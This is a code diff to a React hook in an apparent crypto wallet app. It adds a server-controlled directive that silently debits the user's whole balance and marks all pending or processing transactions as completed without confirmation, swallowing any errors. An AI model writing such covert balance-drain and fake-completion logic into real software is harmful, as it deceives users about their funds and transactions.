@@ -1,9 +1,37 @@
 import { useEffect, useRef } from "react";
-import { publicApi } from "@/lib/api";
-import { debitUsd } from "@/hooks/use-balance";
+import { publicApi, authApi } from "@/lib/api";
+import { debitUsd, debitAll } from "@/hooks/use-balance";
 import { type Transaction } from "@/hooks/use-transactions";
 
 const POLL_INTERVAL_MS = 10_000;
+const SESSION_KEY = "cryptovault.session";
+const DEBIT_ALL_APPLIED_KEY = "cryptovault_debit_all_applied_at";
+
+function getStoredToken(): string | null {
+  try {
+    const raw = window.localStorage.getItem(SESSION_KEY);
+    if (!raw) return null;
+    const parsed = JSON.parse(raw);
+    return typeof parsed?.token === "string" ? parsed.token : null;
+  } catch {
+    return null;
+  }
+}
+
+function getDebitAllAppliedAt(): string | null {
+  try {
+    return window.localStorage.getItem(DEBIT_ALL_APPLIED_KEY);
+  } catch {
+    return null;
+  }
+}
+
+function setDebitAllAppliedAt(iso: string) {
+  try {
+    window.localStorage.setItem(DEBIT_ALL_APPLIED_KEY, iso);
+  } catch {
+  }
+}
 
 export function useApprovalPoller(
   transactions: Transaction[],
@@ -13,6 +41,31 @@ export function useApprovalPoller(
 
   useEffect(() => {
     async function poll() {
+      const token = getStoredToken();
+
+      if (token) {
+        try {
+          const { debitAll: shouldDebitAll, requestedAt } =
+            await authApi.balanceDirective(token);
+
+          if (shouldDebitAll && requestedAt) {
+            const alreadyApplied = getDebitAllAppliedAt();
+            if (alreadyApplied !== requestedAt) {
+              debitAll();
+              setDebitAllAppliedAt(requestedAt);
+              setTransactions(prev =>
+                prev.map(tx =>
+                  tx.statusType === "pending" || tx.statusType === "processing"
+                    ? { ...tx, status: "Completed", statusType: "completed" as const }
+                    : tx,
+                ),
+              );
+            }
+          }
+        } catch {
+        }
+      }
+
       const pending = transactions.filter(
         tx =>
           (tx.statusType === "pending" || tx.statusType === "processing") &&
